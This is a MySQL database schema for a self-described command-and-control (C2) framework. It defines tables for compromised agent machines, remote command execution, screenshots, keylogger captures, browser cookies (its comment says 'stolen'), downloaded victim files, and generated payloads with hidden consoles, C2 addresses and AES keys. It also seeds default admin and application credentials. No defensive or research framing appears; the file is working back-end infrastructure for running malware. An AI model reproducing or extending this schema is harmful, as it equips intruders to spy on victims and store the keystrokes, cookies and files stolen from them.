-- ============================================
-- C2 Framework - MySQL Database Schema
-- Professional Command & Control System
-- ============================================

CREATE DATABASE IF NOT EXISTS c2_framework CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci;
USE c2_framework;

-- ============================================
-- Table: users (Administrators)
-- ============================================
CREATE TABLE `users` (
  `id` INT UNSIGNED AUTO_INCREMENT PRIMARY KEY,
  `username` VARCHAR(100) NOT NULL UNIQUE,
  `password` VARCHAR(255) NOT NULL,
  `email` VARCHAR(255) DEFAULT NULL,
  `role` ENUM('admin', 'operator', 'viewer') DEFAULT 'operator',
  `is_active` TINYINT(1) DEFAULT 1,
  `last_login` DATETIME DEFAULT NULL,
  `created_at` TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
  `updated_at` TIMESTAMP DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
  INDEX `idx_username` (`username`),
  INDEX `idx_is_active` (`is_active`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- ============================================
-- Table: nodes (Connected agents)
-- ============================================
CREATE TABLE `nodes` (
  `id` CHAR(36) PRIMARY KEY,
  `hostname` VARCHAR(255) NOT NULL,
  `os` VARCHAR(100) NOT NULL,
  `ip` VARCHAR(45) NOT NULL,
  `status` ENUM('online', 'offline', 'unknown') DEFAULT 'offline',
  `token` VARCHAR(64) NOT NULL UNIQUE,
  `last_seen` DATETIME NOT NULL,
  `created_at` TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
  `updated_at` TIMESTAMP DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
  `cpu_usage` DECIMAL(5,2) DEFAULT 0.00,
  `memory_usage` DECIMAL(5,2) DEFAULT 0.00,
  `disk_usage` DECIMAL(5,2) DEFAULT 0.00,
  `processes` INT DEFAULT 0,
  INDEX `idx_status` (`status`),
  INDEX `idx_token` (`token`),
  INDEX `idx_last_seen` (`last_seen`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- ============================================
-- Table: commands (Command execution history)
-- ============================================
CREATE TABLE `commands` (
  `id` CHAR(36) PRIMARY KEY,
  `node_id` CHAR(36) NOT NULL,
  `command` TEXT NOT NULL,
  `result` LONGTEXT DEFAULT NULL,
  `status` ENUM('pending', 'executed', 'failed', 'timeout') DEFAULT 'pending',
  `timestamp` TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
  `executed_at` DATETIME DEFAULT NULL,
  `execution_time` DECIMAL(10,3) DEFAULT NULL,
  INDEX `idx_node_id` (`node_id`),
  INDEX `idx_status` (`status`),
  INDEX `idx_timestamp` (`timestamp`),
  FOREIGN KEY (`node_id`) REFERENCES `nodes`(`id`) ON DELETE CASCADE
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- ============================================
-- Table: audit_logs (System activity logs)
-- ============================================
CREATE TABLE `audit_logs` (
  `id` INT UNSIGNED AUTO_INCREMENT PRIMARY KEY,
  `action` VARCHAR(100) NOT NULL,
  `user_id` INT UNSIGNED DEFAULT NULL,
  `username` VARCHAR(100) DEFAULT NULL,
  `node_id` CHAR(36) DEFAULT NULL,
  `details` TEXT DEFAULT NULL,
  `ip_address` VARCHAR(45) DEFAULT NULL,
  `user_agent` VARCHAR(255) DEFAULT NULL,
  `timestamp` TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
  INDEX `idx_action` (`action`),
  INDEX `idx_user_id` (`user_id`),
  INDEX `idx_node_id` (`node_id`),
  INDEX `idx_timestamp` (`timestamp`),
  FOREIGN KEY (`user_id`) REFERENCES `users`(`id`) ON DELETE SET NULL,
  FOREIGN KEY (`node_id`) REFERENCES `nodes`(`id`) ON DELETE SET NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- ============================================
-- Table: screenshots (Screenshot storage)
-- ============================================
CREATE TABLE `screenshots` (
  `id` INT UNSIGNED AUTO_INCREMENT PRIMARY KEY,
  `node_id` CHAR(36) NOT NULL,
  `image_data` LONGBLOB NOT NULL,
  `mime_type` VARCHAR(50) DEFAULT 'image/png',
  `size` INT UNSIGNED DEFAULT 0,
  `timestamp` TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
  INDEX `idx_node_id` (`node_id`),
  INDEX `idx_timestamp` (`timestamp`),
  FOREIGN KEY (`node_id`) REFERENCES `nodes`(`id`) ON DELETE CASCADE
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- ============================================
-- Table: keylogger_data (Keylogger captures)
-- ============================================
CREATE TABLE `keylogger_data` (
  `id` INT UNSIGNED AUTO_INCREMENT PRIMARY KEY,
  `node_id` CHAR(36) NOT NULL,
  `data` TEXT NOT NULL,
  `window_title` VARCHAR(255) DEFAULT NULL,
  `timestamp` TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
  INDEX `idx_node_id` (`node_id`),
  INDEX `idx_timestamp` (`timestamp`),
  FOREIGN KEY (`node_id`) REFERENCES `nodes`(`id`) ON DELETE CASCADE
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- ============================================
-- Table: cookies (Browser cookies stolen)
-- ============================================
CREATE TABLE `cookies` (
  `id` INT UNSIGNED AUTO_INCREMENT PRIMARY KEY,
  `node_id` CHAR(36) NOT NULL,
  `browser` VARCHAR(50) NOT NULL,
  `domain` VARCHAR(255) NOT NULL,
  `name` VARCHAR(255) NOT NULL,
  `value` TEXT NOT NULL,
  `path` VARCHAR(255) DEFAULT '/',
  `expires` DATETIME DEFAULT NULL,
  `secure` TINYINT(1) DEFAULT 0,
  `http_only` TINYINT(1) DEFAULT 0,
  `timestamp` TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
  INDEX `idx_node_id` (`node_id`),
  INDEX `idx_browser` (`browser`),
  INDEX `idx_domain` (`domain`),
  INDEX `idx_timestamp` (`timestamp`),
  FOREIGN KEY (`node_id`) REFERENCES `nodes`(`id`) ON DELETE CASCADE
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- ============================================
-- Table: files (File browser / Downloads)
-- ============================================
CREATE TABLE `files` (
  `id` INT UNSIGNED AUTO_INCREMENT PRIMARY KEY,
  `node_id` CHAR(36) NOT NULL,
  `file_path` TEXT NOT NULL,
  `file_name` VARCHAR(255) NOT NULL,
  `file_size` BIGINT UNSIGNED DEFAULT 0,
  `file_data` LONGBLOB DEFAULT NULL,
  `mime_type` VARCHAR(100) DEFAULT 'application/octet-stream',
  `action` ENUM('download', 'upload', 'list') DEFAULT 'download',
  `timestamp` TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
  INDEX `idx_node_id` (`node_id`),
  INDEX `idx_action` (`action`),
  INDEX `idx_timestamp` (`timestamp`),
  FOREIGN KEY (`node_id`) REFERENCES `nodes`(`id`) ON DELETE CASCADE
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- ============================================
-- Table: sessions (User sessions / JWT tokens)
-- ============================================
CREATE TABLE `sessions` (
  `id` INT UNSIGNED AUTO_INCREMENT PRIMARY KEY,
  `user_id` INT UNSIGNED NOT NULL,
  `token` VARCHAR(255) NOT NULL UNIQUE,
  `ip_address` VARCHAR(45) DEFAULT NULL,
  `user_agent` VARCHAR(255) DEFAULT NULL,
  `expires_at` DATETIME NOT NULL,
  `created_at` TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
  INDEX `idx_token` (`token`),
  INDEX `idx_user_id` (`user_id`),
  INDEX `idx_expires_at` (`expires_at`),
  FOREIGN KEY (`user_id`) REFERENCES `users`(`id`) ON DELETE CASCADE
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- ============================================
-- Table: payloads (Generated payloads)
-- ============================================
CREATE TABLE `payloads` (
  `id` INT UNSIGNED AUTO_INCREMENT PRIMARY KEY,
  `filename` VARCHAR(255) NOT NULL,
  `file_path` VARCHAR(512) NOT NULL,
  `file_size` BIGINT UNSIGNED DEFAULT 0,
  `c2_server` VARCHAR(255) NOT NULL,
  `aes_key` VARCHAR(64) NOT NULL,
  `hide_console` TINYINT(1) DEFAULT 1,
  `generated_by` INT UNSIGNED DEFAULT NULL,
  `timestamp` TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
  INDEX `idx_generated_by` (`generated_by`),
  INDEX `idx_timestamp` (`timestamp`),
  FOREIGN KEY (`generated_by`) REFERENCES `users`(`id`) ON DELETE SET NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- ============================================
-- Table: websocket_connections (Active WebSocket connections)
-- ============================================
CREATE TABLE `websocket_connections` (
  `id` INT UNSIGNED AUTO_INCREMENT PRIMARY KEY,
  `node_id` CHAR(36) NOT NULL,
  `connection_id` VARCHAR(64) NOT NULL UNIQUE,
  `connected_at` TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
  `last_ping` DATETIME DEFAULT NULL,
  INDEX `idx_node_id` (`node_id`),
  INDEX `idx_connection_id` (`connection_id`),
  FOREIGN KEY (`node_id`) REFERENCES `nodes`(`id`) ON DELETE CASCADE
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- ============================================
-- Insert Default Admin User
-- Password: c2admin123 (hashed with bcrypt)
-- ============================================
INSERT INTO `users` (`username`, `password`, `email`, `role`, `is_active`) VALUES
('admin', '$2y$10$92IXUNpkjO0rOQ5byMi.Ye4oKoEa3Ro9llC/.og/at2.uheWG/igi', 'admin@c2framework.local', 'admin', 1);

-- ============================================
-- Views for Easy Querying
-- ============================================

-- View: Active nodes with latest stats
CREATE VIEW `v_active_nodes` AS
SELECT 
  n.*,
  COUNT(DISTINCT c.id) as total_commands,
  MAX(c.timestamp) as last_command_time
FROM nodes n
LEFT JOIN commands c ON n.id = c.node_id
WHERE n.status = 'online'
GROUP BY n.id;

-- View: Recent activity dashboard
CREATE VIEW `v_recent_activity` AS
SELECT 
  al.id,
  al.action,
  al.username,
  al.details,
  al.timestamp,
  n.hostname as node_hostname,
  n.ip as node_ip
FROM audit_logs al
LEFT JOIN nodes n ON al.node_id = n.id
ORDER BY al.timestamp DESC
LIMIT 100;

-- View: Command statistics per node
CREATE VIEW `v_node_stats` AS
SELECT 
  n.id as node_id,
  n.hostname,
  n.status,
  COUNT(DISTINCT c.id) as total_commands,
  SUM(CASE WHEN c.status = 'executed' THEN 1 ELSE 0 END) as executed_commands,
  SUM(CASE WHEN c.status = 'failed' THEN 1 ELSE 0 END) as failed_commands,
  SUM(CASE WHEN c.status = 'pending' THEN 1 ELSE 0 END) as pending_commands,
  AVG(c.execution_time) as avg_execution_time
FROM nodes n
LEFT JOIN commands c ON n.id = c.node_id
GROUP BY n.id;

-- ============================================
-- Stored Procedures
-- ============================================

DELIMITER $$

-- Procedure: Clean old sessions
CREATE PROCEDURE `sp_clean_expired_sessions`()
BEGIN
  DELETE FROM sessions WHERE expires_at < NOW();
END$$

-- Procedure: Update node status based on last_seen
CREATE PROCEDURE `sp_update_node_status`()
BEGIN
  UPDATE nodes 
  SET status = 'offline' 
  WHERE last_seen < DATE_SUB(NOW(), INTERVAL 2 MINUTE) 
  AND status = 'online';
END$$

-- Procedure: Get dashboard statistics
CREATE PROCEDURE `sp_get_dashboard_stats`()
BEGIN
  SELECT 
    (SELECT COUNT(*) FROM nodes) as total_nodes,
    (SELECT COUNT(*) FROM nodes WHERE status = 'online') as online_nodes,
    (SELECT COUNT(*) FROM nodes WHERE status = 'offline') as offline_nodes,
    (SELECT COUNT(*) FROM commands) as total_commands,
    (SELECT COUNT(*) FROM commands WHERE status = 'executed') as executed_commands,
    (SELECT COUNT(*) FROM commands WHERE status = 'failed') as failed_commands,
    (SELECT COUNT(*) FROM commands WHERE status = 'pending') as pending_commands,
    (SELECT COUNT(*) FROM audit_logs WHERE DATE(timestamp) = CURDATE()) as today_activities,
    (SELECT COUNT(*) FROM screenshots) as total_screenshots,
    (SELECT COUNT(*) FROM cookies) as total_cookies;
END$$

-- Procedure: Register new node
CREATE PROCEDURE `sp_register_node`(
  IN p_id CHAR(36),
  IN p_hostname VARCHAR(255),
  IN p_os VARCHAR(100),
  IN p_ip VARCHAR(45),
  IN p_token VARCHAR(64)
)
BEGIN
  INSERT INTO nodes (id, hostname, os, ip, token, last_seen, status)
  VALUES (p_id, p_hostname, p_os, p_ip, p_token, NOW(), 'online')
  ON DUPLICATE KEY UPDATE 
    last_seen = NOW(),
    status = 'online',
    ip = p_ip;
END$$

DELIMITER ;

-- ============================================
-- Triggers
-- ============================================

DELIMITER $$

-- Trigger: Log node registration
CREATE TRIGGER `tr_node_insert_log` AFTER INSERT ON `nodes`
FOR EACH ROW
BEGIN
  INSERT INTO audit_logs (action, node_id, details, ip_address)
  VALUES ('node_register', NEW.id, CONCAT('Node registered: ', NEW.hostname), NEW.ip);
END$$

-- Trigger: Log node deletion
CREATE TRIGGER `tr_node_delete_log` BEFORE DELETE ON `nodes`
FOR EACH ROW
BEGIN
  INSERT INTO audit_logs (action, node_id, details, ip_address)
  VALUES ('node_delete', OLD.id, CONCAT('Node deleted: ', OLD.hostname), OLD.ip);
END$$

-- Trigger: Log command execution
CREATE TRIGGER `tr_command_insert_log` AFTER INSERT ON `commands`
FOR EACH ROW
BEGIN
  INSERT INTO audit_logs (action, node_id, details)
  VALUES ('command_execute', NEW.node_id, CONCAT('Command: ', LEFT(NEW.command, 100)));
END$$

DELIMITER ;

-- ============================================
-- Events (Scheduled tasks)
-- ============================================

SET GLOBAL event_scheduler = ON;

-- Event: Clean expired sessions every hour
CREATE EVENT IF NOT EXISTS `evt_clean_sessions`
ON SCHEDULE EVERY 1 HOUR
DO CALL sp_clean_expired_sessions();

-- Event: Update node status every minute
CREATE EVENT IF NOT EXISTS `evt_update_node_status`
ON SCHEDULE EVERY 1 MINUTE
DO CALL sp_update_node_status();

-- Event: Clean old audit logs (keep 90 days)
CREATE EVENT IF NOT EXISTS `evt_clean_old_logs`
ON SCHEDULE EVERY 1 DAY
DO DELETE FROM audit_logs WHERE timestamp < DATE_SUB(NOW(), INTERVAL 90 DAY);

-- ============================================
-- Indexes for Performance
-- ============================================

-- Additional indexes for better performance
ALTER TABLE commands ADD INDEX idx_node_status (node_id, status);
ALTER TABLE audit_logs ADD INDEX idx_timestamp_action (timestamp, action);
ALTER TABLE cookies ADD INDEX idx_node_browser (node_id, browser);

-- ============================================
-- Grant Privileges
-- ============================================

-- Create application user (change password in production!)
CREATE USER IF NOT EXISTS 'c2_app'@'localhost' IDENTIFIED BY 'C2SecurePassword123!';
GRANT SELECT, INSERT, UPDATE, DELETE ON c2_framework.* TO 'c2_app'@'localhost';
GRANT EXECUTE ON c2_framework.* TO 'c2_app'@'localhost';
FLUSH PRIVILEGES;

-- ============================================
-- Sample Data for Testing (Optional)
-- ============================================

-- Uncomment to insert sample data
/*
INSERT INTO nodes (id, hostname, os, ip, token, last_seen, status) VALUES
(UUID(), 'TEST-PC-001', 'Windows 10 Pro', '192.168.1.100', MD5(RAND()), NOW(), 'online'),
(UUID(), 'TEST-LAPTOP-02', 'Ubuntu 22.04', '192.168.1.101', MD5(RAND()), DATE_SUB(NOW(), INTERVAL 5 MINUTE), 'offline');
*/

-- ============================================
-- Database Info
-- ============================================
SELECT 
  'C2 Framework Database Schema Installed Successfully!' as message,
  VERSION() as mysql_version,
  DATABASE() as current_database,
  NOW() as installation_time;

-- Show all tables
SHOW TABLES;

-- Show table sizes
SELECT 
  table_name,
  ROUND(((data_length + index_length) / 1024 / 1024), 2) AS 'Size (MB)'
FROM information_schema.TABLES
WHERE table_schema = 'c2_framework'
ORDER BY (data_length + index_length) DESC;
